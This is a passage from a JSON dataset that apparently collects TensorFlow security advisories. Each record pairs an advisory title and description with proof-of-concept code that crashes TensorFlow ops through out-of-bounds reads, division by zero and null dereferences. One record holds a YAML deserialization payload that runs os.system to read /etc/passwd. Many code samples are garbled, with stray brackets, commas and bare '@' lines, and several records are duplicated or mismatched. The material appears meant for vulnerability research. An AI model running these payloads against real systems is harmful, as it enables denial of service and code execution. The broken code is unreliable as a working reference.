    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-34f9-hjfq-rr8j",
    "API Signature": "tf.raw_ops.UnravelIndex(\n    indices, dims, name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB access in `FractionalAvgPoolGrad`\n      ",
    "Bug description": "The  implementation of   does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:",
    "Sample Code": "@\ndef test():\n  y = tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape=[2,2,2,2],\n    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],\n    row_pooling_sequence=[-10,1,2,3],\n    col_pooling_sequence=[1,2,3,4],\n    overlapping=True)\n  return y\n    \n\n    \ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vjg4-v33c-ggc4",
    "API Signature": "tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Integer overflow in shape inference for `Dequantize`\n      ",
    "Bug description": "The  implementation of shape inference for   is vulnerable to an integer overflow weakness:",
    "Sample Code": "input = tf.constant([1,1],dtype=tf.qint32)\n\n@\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=input,\n    min_range=[1.0],\n    max_range=[10.0],\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\n\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c6fh-56w7-fvjw",
    "API Signature": "tf.raw_ops.Dequantize(\n    input,\n    min_range,\n    max_range,\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=-1,\n    dtype=tf.dtypes.float32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB access in `Dequantize`\n      ",
    "Bug description": "The  implementation of   does not fully validate the value of  axis  and can result in heap OOB accesses:",
    "Sample Code": "@\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=tf.constant([1,1],dtype=tf.qint32),\n    min_range=[1.0],\n    max_range=[10.0],\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\n\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-23hm-7w47-xw72",
    "API Signature": "tf.raw_ops.Dequantize(\n    input,\n    min_range,\n    max_range,\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=-1,\n    dtype=tf.dtypes.float32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB read in shape inference for `ReverseSequence`\n      ",
    "Bug description": "The  implementation of shape inference for   does not fully validate the value of  batch_dim  and can result in a heap OOB read:",
    "Sample Code": "@\ndef test():\n  y = tf.raw_ops.ReverseSequence(\n    input = ['aaa','bbb'],\n    seq_lengths = [1,1,1],\n    seq_dim = -10,\n    batch_dim = -10 )\n  return y\n    \n\n    \ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6gmv-pjp9-p8w8",
    "API Signature": "tf.raw_ops.ReverseSequence(\n    input, seq_lengths, seq_dim, batch_dim=0, name=None\n)\n"
  },
  {
    "Title": "\n        Floating point division by 0 when executing convolution operators\n      ",
    "Bug description": "The  estimator for the cost of some convolution operations  can be made to execute a division by 0:",
    "Sample Code": "@\ndef test():\n  y=tf.raw_ops.AvgPoolGrad(\n    orig_input_shape=[1,1,1,1],\n    grad=[[[[1.0],[1.0],[1.0]]],[[[2.0],[2.0],[2.0]]],[[[3.0],[3.0],[3.0]]]],\n    ksize=[1,1,1,1],\n    strides=[1,1,1,0],\n    padding='VALID',\n    data_format='NCHW')\n  return y\n\n\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v3f7-j968-4h5f",
    "API Signature": "tf.raw_ops.AvgPoolGrad(\n    orig_input_shape,\n    grad,\n    ksize,\n    strides,\n    padding,\n    data_format='NHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        `SparseFillEmptyRows` heap OOB\n      ",
    "Bug description": "The  implementation  of  SparseFillEmptyRows  can be made to trigger a heap OOB access:",
    "Sample Code": "data=tf.raw_ops.SparseFillEmptyRows(\n  indices=[[0,0],[0,0],[0,0]],\n  values=['sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'],\n  dense_shape=[5,3],\n  ],\n  default_value='o')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rg3m-hqc5-344v",
    "API Signature": "tf.raw_ops.SparseFillEmptyRows(\n    indices, values, dense_shape, default_value, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault due to negative splits in `SplitV`\n      ",
    "Bug description": "The  implementation  of  SplitV  can trigger a segfault is an attacker supplies negative arguments:",
    "Sample Code": "tf.raw_ops.SplitV(\n  value=tf.constant([]),\n  size_splits=[-1, -2]\n  ,axis=0,\n  ,\n  num_split=2)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cpf4-wx82-gxp6",
    "API Signature": "tf.raw_ops.SplitV(\n    value, size_splits, axis, num_split, name=None\n)\n"
  },
  {
    "Title": "\n        Segfault due to negative splits in `SplitV`\n      ",
    "Bug description": "The  implementation  of  SplitV  can trigger a segfault is an attacker supplies negative arguments:",
    "Sample Code": "tf.raw_ops.SplitV(\n  value=tf.constant([]),\n  size_splits=[-1, -2]\n  ,axis=0,\n  ,\n  num_split=2)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cpf4-wx82-gxp6",
    "API Signature": "tf.raw_ops.SplitV(\n    value, size_splits, axis, num_split, name=None\n)\n"
  },
  {
    "Title": "\n        Access to invalid memory during shape inference in `Cudnn*` ops\n      ",
    "Bug description": "The  shape inference code  for the  Cudnn*  operations in TensorFlow can be tricked into accessing invalid memory, via a heap buffer overflow:",
    "Sample Code": "@\ndef func():\n  return tf.raw_ops.CudnnRNNV3(\n    input=[0.1, 0.1],\n    input_h=[0.5],\n    input_c=[0.1, 0.1, 0.1], \n    params=[0.5, 0.5],\n    sequence_lengths=[-1, 0, 1])\n  \n])\n  \nfunc() ",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cqv6-3phm-hcwx",
    "API Signature": "tf.raw_ops.CudnnRNNV3(\n    input,\n    input_h,\n    input_c,\n    params,\n    sequence_lengths,\n    rnn_mode='lstm',\n    input_mode='linear_input',\n    direction='unidirectional',\n    dropout=0,\n    seed=0,\n    seed2=0,\n    num_proj=0,\n    is_training=True,\n    time_major=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Integer division by 0 in `tf.raw_ops.AllToAll`\n      ",
    "Bug description": "The  shape inference code for   can be made to execute a division by 0:",
    "Sample Code": "@\ndef func():\n  return tf.raw_ops.AllToAll(\n    input=[0.0, 0.1652, 0.6543],\n    group_assignment=[1, -1],\n    concat_dimension=0,\n    split_dimension=0,\n    split_count=0)\n\n)\n\nfunc()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9crf-c6qr-r273",
    "API Signature": "tf.raw_ops.AllToAll(\n    input,\n    group_assignment,\n    concat_dimension,\n    split_dimension,\n    split_count,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Use after free / memory leak in `CollectiveReduceV2`\n      ",
    "Bug description": "The  async implementation  of  CollectiveReduceV2  suffers from a memory leak and a use after free:",
    "Sample Code": "tf.raw_ops.CollectiveReduceV2(\n  input=[],\n  group_size=[-10, -10, -10],\n  group_key=[-10, -10],\n  instance_key=[-10],\n  ordering_token=[],\n  merge_op='Mul',\n  ,\n  final_op='Div')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gpfh-jvf9-7wg5",
    "API Signature": "tf.raw_ops.CollectiveReduceV2(\n    input,\n    group_size,\n    group_key,\n    instance_key,\n    ordering_token,\n    merge_op,\n    final_op,\n    communication_hint='auto',\n    timeout_seconds=0,\n    max_subdivs_per_device=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Undefined behavior via `nullptr` reference binding in sparse matrix multiplication\n      ",
    "Bug description": "The  code for sparse matrix multiplication  is vulnerable to undefined behavior via binding a reference to  nullptr :",
    "Sample Code": "tf.raw_ops.SparseMatMul(\n  a=[[1.0,1.0,1.0]],\n  b=[[],[],[]],\n  transpose_a=False,\n  transpose_b=False,\n  a_is_sparse=False, \n  , \n  b_is_sparse=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4f99-p9c2-3j8x",
    "API Signature": "tf.raw_ops.SparseMatMul(\n    a,\n    b,\n    transpose_a=False,\n    transpose_b=False,\n    a_is_sparse=False,\n    b_is_sparse=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `Transpose`\n      ",
    "Bug description": "The  shape inference function for   is vulnerable to a heap buffer overflow:",
    "Sample Code": "@\ndef test():\n  y = tf.raw_ops.Transpose(x=[1,2,3,4],perm=[-10])\n  return y\n\n\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3ff2-r28g-w7h9",
    "API Signature": "tf.raw_ops.Transpose(\n    x, perm, name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer exception in `DeserializeSparse`\n      ",
    "Bug description": "The  shape inference code for   can trigger a null pointer dereference:",
    "Sample Code": "dataset = tf.data.Dataset.range(3)\n  \n@                 \ndef test():                  \n  y = tf.raw_ops.DeserializeSparse(\n    serialized_sparse=tf.data.experimental.to_variant(dataset),\n    dtype=tf.int32)\n\n)\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x3v8-c8qx-3j3r",
    "API Signature": "tf.raw_ops.DeserializeSparse(\n    serialized_sparse, dtype, name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to `nullptr` in `tf.ragged.cross`\n      ",
    "Bug description": "The  shape inference code for   has an undefined behavior due to binding a reference to  nullptr . In the following scenario, this results in a crash:",
    "Sample Code": "@                 \ndef test():     \n  y = tf.ragged.cross([tf.ragged.constant([['1']]),'2'])\n  return y                   \n                             \n                   \n                             \ntest()        ",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vwhq-49r4-gj9v",
    "API Signature": "tf.ragged.cross(\n    inputs, name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in shape inference for `QuantizeV2`\n      ",
    "Bug description": "The  shape inference code for   can trigger a read outside of bounds of heap allocated array:",
    "Sample Code": "@\ndef test():\n  data=tf.raw_ops.QuantizeV2(\n    input=[1.0,1.0],\n    min_range=[1.0,10.0],\n    max_range=[1.0,10.0],\n    T=tf.qint32,\n    mode='MIN_COMBINED',\n    round_mode='HALF_TO_EVEN',\n    narrow_range=False,\n    axis=-100,\n    ensure_minimum_range=10)\n  return data\n\n\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvgx-3v3q-m36c",
    "API Signature": "tf.raw_ops.QuantizeV2(\n    input,\n    min_range,\n    max_range,\n    T,\n    mode='MIN_COMBINED',\n    round_mode='HALF_AWAY_FROM_ZERO',\n    narrow_range=False,\n    axis=-1,\n    ensure_minimum_range=0.01,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB read in all `tf.raw_ops.QuantizeAndDequantizeV*` ops\n      ",
    "Bug description": "The  shape inference functions for the   can trigger a read outside of bounds of heap allocated array as illustrated in the following sets of PoCs:",
    "Sample Code": "@\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV2(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    round_mode='HALF_TO_EVEN',\n    narrow_range=False,\n    axis=-100)\n  return data\n\n\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-49rx-x2rw-pc6f",
    "API Signature": "tf.raw_ops.QuantizeAndDequantizeV4Grad(\n    gradients, input, input_min, input_max, axis=-1, name=None\n)\n"
  },
  {
    "Title": "\n        FPE in `ParallelConcat`\n      ",
    "Bug description": "The  implementation of   misses some input validation and can produce a division by 0:",
    "Sample Code": "@\ndef test():\n  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)\n  return y\n\n\n\ntest()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h",
    "API Signature": "tf.raw_ops.ParallelConcat(\n    values, shape, name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB read in `tf.raw_ops.SparseCountSparseOutput`\n      ",
    "Bug description": "The  shape inference functions for   can trigger a read outside of bounds of heap allocated array:",
    "Sample Code": "@\ndef func():\n  return tf.raw_ops.SparseCountSparseOutput(\n    indices=[1],\n    values=[[1]],\n    dense_shape=[10],\n    weights=[],\n    binary_output= True)\n\n)\n\nfunc()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m342-ff57-4jcc",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Overflow/crash in `tf.range`\n      ",
    "Bug description": "While calculating the size of the output within the  tf.range  kernel, there is a conditional statement of type  int64 = condition ? int64 : double . Due to C++ implicit conversion rules, both branches of the condition will be cast to  double  and the result would be truncated before the assignment. This result in overflows:",
    "Sample Code": " tensorflow as tf\n\ntf.range(start=-1e+38, limit=1)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xrqm-fpgr-6hhx",
    "API Signature": null
  },
  {
    "Title": "\n        Overflow/crash in `tf.image.resize` when size is large\n      ",
    "Bug description": "If  tf.image.resize  is called with a large input argument then the TensorFlow process will crash due to a  CHECK -failure caused by an overflow.",
    "Sample Code": "import numpy as np\n\ntf.keras.layers.UpSampling2D(\n  size=1610637938,\n  data_format='channels_first',\n  ,\n  interpolation='bilinear')(np.ones((5,1,1,1)))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5hx2-qx8j-qjqm",
    "API Signature": "tf.keras.layers.UpSampling2D(\n    size=(2, 2), data_format=None, interpolation='nearest', **kwargs\n)\n"
  },
  {
    "Title": "\n        Overflow/crash in `tf.tile` when tiling tensor is large\n      ",
    "Bug description": "If  tf.tile  is called with a large input argument then the TensorFlow process will crash due to a  CHECK -failure caused by an overflow.",
    "Sample Code": "import numpy as np\n\ntf.keras.backend.tile(x=np.ones((1,1,1)), n=[100000000,100000000, 100000000])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2p25-55c9-h58q",
    "API Signature": null
  },
  {
    "Title": "\n        Incomplete validation in `tf.summary.create_file_writer`\n      ",
    "Bug description": "If  tf.summary.create_file_writer  is called with non-scalar arguments code crashes due to a  CHECK -fail.",
    "Sample Code": "import numpy as np\n\ntf.summary.create_file_writer(logdir='', flush_millis=np.ones((1,2)))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh8h-7j2j-qv4f",
    "API Signature": "tf.summary.create_file_writer(\n    logdir,\n    max_queue=None,\n    flush_millis=None,\n    filename_suffix=None,\n    name=None,\n    experimental_trackable=False\n)\n"
  },
  {
    "Title": "\n        Crash in `max_pool3d` when size argument is 0 or negative\n      ",
    "Bug description": "The Keras pooling layers can trigger a segfault if the size of the pool is 0 or if a dimension is negative:",
    "Sample Code": "pool_size = [2, 2, 0]\nlayer = tf.keras.layers.MaxPooling3D(strides=1, pool_size=pool_size)\ninput_tensor = tf.random.uniform([3, 4, 10, 11, 12], dtype=tf.float32)\n)\nres = layer(input_tensor)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m539-j985-hcr8",
    "API Signature": null
  },
  {
    "Title": "\n        Crash in `max_pool3d` when size argument is 0 or negative\n      ",
    "Bug description": "The Keras pooling layers can trigger a segfault if the size of the pool is 0 or if a dimension is negative:",
    "Sample Code": "pool_size = [2, 2, 0]\nlayer = tf.keras.layers.MaxPooling3D(strides=1, pool_size=pool_size)\ninput_tensor = tf.random.uniform([3, 4, 10, 11, 12], dtype=tf.float32)\n)\nres = layer(input_tensor)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m539-j985-hcr8",
    "API Signature": null
  },
  {
    "Title": "\n        Crash in `tf.math.segment_*` operations\n      ",
    "Bug description": "The implementation of  tf.math.segment_*  operations results in a  CHECK -fail related abort (and denial of service) if a segment id in  segment_ids  is large.",
    "Sample Code": "tf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])    \ntf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\n])\ntf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh",
    "API Signature": "tf.math.segment_max(\n    data, segment_ids, name=None\n)\n"
  },
  {
    "Title": "\n        Crash in `tf.math.segment_*` operations\n      ",
    "Bug description": "The implementation of  tf.math.segment_*  operations results in a  CHECK -fail related abort (and denial of service) if a segment id in  segment_ids  is large.",
    "Sample Code": "tf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])    \ntf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\n])\ntf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh",
    "API Signature": "tf.math.segment_min(\n    data, segment_ids, name=None\n)\n"
  },
  {
    "Title": "\n        Crash in `tf.math.segment_*` operations\n      ",
    "Bug description": "The implementation of  tf.math.segment_*  operations results in a  CHECK -fail related abort (and denial of service) if a segment id in  segment_ids  is large.",
    "Sample Code": "tf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])    \ntf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\n])\ntf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh",
    "API Signature": "tf.math.segment_mean(\n    data, segment_ids, name=None\n)\n"
  },
  {
    "Title": "\n        Crash in `tf.math.segment_*` operations\n      ",
    "Bug description": "The implementation of  tf.math.segment_*  operations results in a  CHECK -fail related abort (and denial of service) if a segment id in  segment_ids  is large.",
    "Sample Code": "tf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])    \ntf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\n])\ntf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh",
    "API Signature": "tf.math.segment_sum(\n    data, segment_ids, name=None\n)\n"
  },
  {
    "Title": "\n        Crash in `tf.math.segment_*` operations\n      ",
    "Bug description": "The implementation of  tf.math.segment_*  operations results in a  CHECK -fail related abort (and denial of service) if a segment id in  segment_ids  is large.",
    "Sample Code": "tf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])    \ntf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\n])\ntf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh",
    "API Signature": "tf.math.segment_prod(\n    data, segment_ids, name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in TFLite's `Gather*` implementations\n      ",
    "Bug description": "TFLite's  GatherNd  does not support negative indices but there are no checks for this situation.",
    "Sample Code": "import numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\n)\n\ninterpreter.invoke()",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437",
    "API Signature": null
  },
  {
    "Title": "\n        Arbitrary code execution due to YAML deserialization\n      ",
    "Bug description": "TensorFlow and Keras can be tricked to perform arbitrary code execution when deserializing a Keras model from YAML format.",
    "Sample Code": "payload = '''\n!!python/object/new:type\nargs: ['z', !!python/tuple [], {'extend': !!python/name:exec }]\nlistitems: \"__import__('os').system('cat /etc/passwd')\"\n'''\n  \n\n  \nmodels.model_from_yaml(payload)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r6jx-9g48-2r5r",
    "API Signature": "tf.keras.models.model_from_yaml(\n    yaml_string, custom_objects=None\n)\n"
  },
  {
    "Title": "\n        Missing validation in shape inference for `Dequantize`\n      ",
    "Bug description": "The shape inference code for  tf.raw_ops.Dequantize  has a vulnerability that could trigger a denial of service via a segfault if an attacker provides invalid arguments:",
    "Sample Code": "tf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Dequantize(\n  input_tensor = tf.constant(-10.0, dtype=tf.float32),\n  input_tensor = tf.cast(input_tensor, dtype=tf.quint8),\n  min_range = tf.constant([], shape=[0], dtype=tf.float32),\n  max_range = tf.constant([], shape=[0], dtype=tf.float32),\n  mode  = 'MIN_COMBINED',\n  narrow_range=False,\n  axis=-10,\n  ,\n  dtype=tf.dtypes.float32)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qfpc-5pjr-mh26",
    "API Signature": "tf.raw_ops.Dequantize(\n    input,\n    min_range,\n    max_range,\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=-1,\n    dtype=tf.dtypes.float32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in most convolution operators\n      ",
    "Bug description": "Most implementations of convolution operators in TensorFlow are affected by a division by 0 vulnerability where an attacker can trigger a denial of service via a crash:",
    "Sample Code": "tf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Conv2D(\n  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  strides = [1, 1, 1, 1],\n  ],\n  padding = \"SAME\")",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-2mv3-49ww",
    "API Signature": "tf.raw_ops.Conv2D(\n    input,\n    filter,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in most convolution operators\n      ",
    "Bug description": "Most implementations of convolution operators in TensorFlow are affected by a division by 0 vulnerability where an attacker can trigger a denial of service via a crash:",
    "Sample Code": "tf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Conv2D(\n  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  strides = [1, 1, 1, 1],\n  ],\n  padding = \"SAME\")",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-2mv3-49ww",
    "API Signature": "tf.raw_ops.Conv2D(\n    input,\n    filter,\n    strides,\n    padding,\n    use_cudnn_on_gpu=True,\n    explicit_paddings=[],\n    data_format='NHWC',\n    dilations=[1, 1, 1, 1],\n    name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to nullptr in shape inference\n      ",
    "Bug description": "An attacker can cause undefined behavior via binding a reference to null pointer in  tf.raw_ops.SparseFillEmptyRows :",
    "Sample Code": "tf.compat.v1.disable_v2_behavior()\ntf.raw_ops.SparseFillEmptyRows(\n  indices = tf.constant([], shape=[0, 0], dtype=tf.int64),\n  values = tf.constant([], shape=[0], dtype=tf.int64),\n  dense_shape = tf.constant([], shape=[0], dtype=tf.int64),\n  ),\n  default_value = 0)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v768-w7m9-2vmm",
    "API Signature": "tf.raw_ops.SparseFillEmptyRows(\n    indices, values, dense_shape, default_value, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `MaxPoolGrad`\n      ",
    "Bug description": "An attacker can trigger a denial of service via a segmentation fault in  tf.raw_ops.MaxPoolGrad  caused by missing validation:",
    "Sample Code": "tf.raw_ops.MaxPoolGrad(\n  orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  orig_output = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  grad = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  ksize = [1, 16, 16, 1],\n  strides = [1, 16, 18, 1],\n  padding = \"EXPLICIT\",\n  ,\n  explicit_paddings = [0, 0, 14, 3, 15, 5, 0, 0])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7ghq-fvr3-pj2x",
    "API Signature": "tf.raw_ops.MaxPoolGrad(\n    orig_input,\n    orig_output,\n    grad,\n    ksize,\n    strides,\n    padding,\n    explicit_paddings=[],\n    data_format='NHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in `MaxPoolGrad`\n      ",
    "Bug description": "An attacker can trigger a denial of service via a segmentation fault in  tf.raw_ops.MaxPoolGrad  caused by missing validation:",
    "Sample Code": "tf.raw_ops.MaxPoolGrad(\n  orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  orig_output = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  grad = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  ksize = [1, 16, 16, 1],\n  strides = [1, 16, 18, 1],\n  padding = \"EXPLICIT\",\n  ,\n  explicit_paddings = [0, 0, 14, 3, 15, 5, 0, 0])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7ghq-fvr3-pj2x",
    "API Signature": "tf.raw_ops.MaxPoolGrad(\n    orig_input,\n    orig_output,\n    grad,\n    ksize,\n    strides,\n    padding,\n    explicit_paddings=[],\n    data_format='NHWC',\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `MapStage`\n      ",
    "Bug description": "An attacker can trigger a denial of service via a  CHECK -fail in  tf.raw_ops.MapStage :",
    "Sample Code": "tf.raw_ops.MapStage(\n  key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),\n  indices=tf.constant((0), dtype=tf.int32),\n  values=[tf.constant((0), dtype=tf.int32)],\n  dtypes=[tf.int32,\n  tf.int64],\n  capacity=0,\n  memory_limit=0,\n  container='',\n  ,\n  shared_name='')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-278g-rq84-9hmg",
    "API Signature": "tf.raw_ops.MapStage(\n    key,\n    indices,\n    values,\n    dtypes,\n    capacity=0,\n    memory_limit=0,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in `SdcaOptimizerV2`\n      ",
    "Bug description": "An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to  tf.raw_ops.SdcaOptimizerV2 :",
    "Sample Code": "tf.raw_ops.SdcaOptimizerV2(\n  sparse_example_indices=[[1]],\n  sparse_feature_indices=[[1]],\n  sparse_feature_values=[[1.0,2.0]],\n  dense_features=[[1.0]],\n  example_weights=[1.0],\n  example_labels=[],\n  sparse_indices=[1],\n  sparse_weights=[1.0],\n  dense_weights=[[1.0]],\n  example_state_data=[[100.0,100.0,100.0,100.0]],\n  loss_type='logistic_loss',\n  l1=100.0,\n  l2=100.0,\n  num_loss_partitions=1,\n  num_inner_iterations=1,\n  ,\n  adaptive=True)       ",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5hj3-vjjf-f5m7",
    "API Signature": "tf.raw_ops.SdcaOptimizerV2(\n    sparse_example_indices,\n    sparse_feature_indices,\n    sparse_feature_values,\n    dense_features,\n    example_weights,\n    example_labels,\n    sparse_indices,\n    sparse_weights,\n    dense_weights,\n    example_state_data,\n    loss_type,\n    l1,\n    l2,\n    num_loss_partitions,\n    num_inner_iterations,\n    adaptive=True,\n    name=None\n)\n"
  },
  {
